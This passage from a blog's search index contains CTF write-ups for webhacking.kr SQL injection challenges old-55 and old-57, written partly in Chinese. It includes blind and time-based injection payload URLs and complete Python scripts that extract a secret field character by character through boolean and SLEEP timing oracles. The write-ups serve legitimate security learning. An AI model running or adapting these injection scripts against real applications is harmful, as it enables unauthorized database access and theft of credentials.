function_">make_session</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.headers.update(&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;old-55-writeup/1.0&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> SESSION_ID:</span><br><span class="line">        session.cookies.<span class="built_in">set</span>(<span class="string">&quot;PHPSESSID&quot;</span>, SESSION_ID, domain=<span class="string">&quot;webhacking.kr&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">session, expression</span>):</span><br><span class="line">    response = session.get(</span><br><span class="line">        ENDPOINT,</span><br><span class="line">        params=&#123;<span class="string">&quot;score&quot;</span>: expression&#125;,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">session, condition</span>):</span><br><span class="line">    <span class="comment"># score=1 is the row identified by TRUE_MARKER; score=2 is the false row.</span></span><br><span class="line">    expression = <span class="string">f&quot;1 and if(<span class="subst">&#123;condition&#125;</span>,1,2)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> TRUE_MARKER <span class="keyword">in</span> query(session, expression)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">discover_length</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, MAX_LENGTH + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> oracle(session, <span class="string">f&quot;length(<span class="subst">&#123;COLUMN&#125;</span>)=<span class="subst">&#123;length&#125;</span>&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;flag length was not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_flag</span>(<span class="params">session, length</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> CHARACTERS:</span><br><span class="line">            candidate = flag + character</span><br><span class="line">            hex_prefix = candidate.encode(<span class="string">&quot;ascii&quot;</span>).<span class="built_in">hex</span>()</span><br><span class="line">            condition = <span class="string">f&quot;left(<span class="subst">&#123;COLUMN&#125;</span>,<span class="subst">&#123;position&#125;</span>) like 0x<span class="subst">&#123;hex_prefix&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> oracle(session, condition):</span><br><span class="line">                flag = candidate</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;no character matched at position <span class="subst">&#123;position&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session = make_session()</span><br><span class="line">    length = discover_length(session)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;length=<span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">    flag = recover_flag(session, length)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag=<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>sql-injection</tag>
+        <tag>blind-sql-injection</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Webhacking.kr old-57</title>
+    <url>/wp/webhacking/old-57/</url>
+    <content><![CDATA[<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Extract the flag stored in the secret field through a timing
+oracle.</p>
+<p>通过 timing oracle 提取 secret 字段中的 flag。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-34/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>服务端把 <code>se</code> 直接拼入 INSERT 的数值位置，并过滤
+<code>select</code>、<code>and</code>、<code>or</code>、<code>not</code>、<code>&amp;</code>、<code>|</code>
+和
+<code>benchmark</code>。<code>IF</code>、<code>LENGTH</code>、<code>ASCII</code>、<code>SUBSTR</code>
+与 <code>SLEEP</code> 仍可使用，因此可以用响应时间区分条件真假。</p>
+<p>条件为真时执行 <code>SLEEP(2)</code>，条件为假时执行
+<code>SLEEP(0)</code>。位置参数按 MySQL 字符串函数约定从 1
+开始。发送请求时必须测量整个 HTTP
+请求耗时，并以明显高于正常响应的延迟作为 true
+oracle，而不是依赖页面正文。</p>
+<h3 id="solution">Solution</h3>
+<p>基础长度探针：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-34/?msg=a&amp;se=IF%28LENGTH%28pw%29%3DN%2CSLEEP%282%29%2CSLEEP%280%29%29</span><br></pre></td></tr></table></figure>
+<p>其中 <code>N</code> 替换为待测试长度。单字符探针：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-34/?msg=a&amp;se=IF%28ASCII%28SUBSTR%28pw%2CN%2C1%29%29%3DC%2CSLEEP%282%29%2CSLEEP%280%29%29</span><br></pre></td></tr></table></figure>
+<p>其中 <code>N</code> 是 1-based 位置，<code>C</code> 是待测试字符的
+ASCII 数值。以下脚本包含长度枚举、字符枚举、请求参数编码、延迟阈值和
+entry point；它不包含任何真实 cookie：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = os.environ.get(<span class="string">&quot;WEBHACKING_BASE&quot;</span>, <span class="string">&quot;https://webhacking.kr&quot;</span>)</span><br><span class="line">ENDPOINT = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/challenge/web-34/&quot;</span></span><br><span class="line">SESSION_ID = os.environ.get(<span class="string">&quot;CHALLENGE_SESSION&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">SLEEP_SECONDS = <span class="number">2</span></span><br><span class="line">DELAY_THRESHOLD = <span class="number">1.5</span></span><br><span class="line">MAX_LENGTH = <span class="number">64</span></span><br><span class="line">CHARACTERS = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_session</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.headers.update(&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;old-57-writeup/1.0&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">if</span> SESSION_ID:</span><br><span class="line">        session.cookies.<span class="built_in">set</span>(<span class="string">&quot;PHPSESSID&quot;</span>, SESSION_ID, domain=<span class="string">&quot;webhacking.kr&quot;</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> session</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">request_is_true</span>(<span class="params">session, condition</span>):</span><br><span class="line">    expression = (</span><br><span class="line">        <span class="string">f&quot;IF(<span class="subst">&#123;condition&#125;</span>,SLEEP(<span class="subst">&#123;SLEEP_SECONDS&#125;</span>),SLEEP(0))&quot;</span></span><br><span class="line">    )</span><br><span class="line">    started = time.monotonic()</span><br><span class="line">    response = session.get(</span><br><span class="line">        ENDPOINT,</span><br><span class="line">        params=&#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;a&quot;</span>, <span class="string">&quot;se&quot;</span>: expression&#125;,</span><br><span class="line">        timeout=SLEEP_SECONDS + <span class="number">10</span>,</span><br><span class="line">    )</span><br><span class="line">    elapsed = time.monotonic() - started</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="keyword">return</span> elapsed &gt;= DELAY_THRESHOLD</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">discover_length</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, MAX_LENGTH + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> request_is_true(session, <span class="string">f&quot;LENGTH(pw)=<span class="subst">&#123;length&#125;</span>&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;password length was not found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover_flag</span>(<span class="params">session, length</span>):</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> character <span class="keyword">in</span> CHARACTERS:</span><br><span class="line">            code = <span class="built_in">ord</span>(character)</span><br><span class="line">            condition = <span class="string">f&quot;ASCII(SUBSTR(pw,<span class="subst">&#123;position&#125;</span>,1))=<span class="subst">&#123;code&#125;</span>&quot;</span></span><br><span class="line">            <span class="keyword">if</span> request_is_true(session, condition):</span><br><span class="line">                flag += character</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;no character matched at position <span class="subst">&#123;position&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session = make_session()</span><br><span class="line">    length = discover_length(session)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;length=<span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line">    flag = recover_flag(session, length)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;flag=<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>Timing oracle 对网络抖动敏感；<code>SLEEP_SECONDS</code> 和
+<code>DELAY_THRESHOLD</code> 需要根据当前网络基线调整。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>writeup</tag>
+        <tag>web</tag>
+        <tag>sql-injection</tag>
+        <tag>blind-sql-injection</tag>
+      </tags>
+  </entry>
 </search>
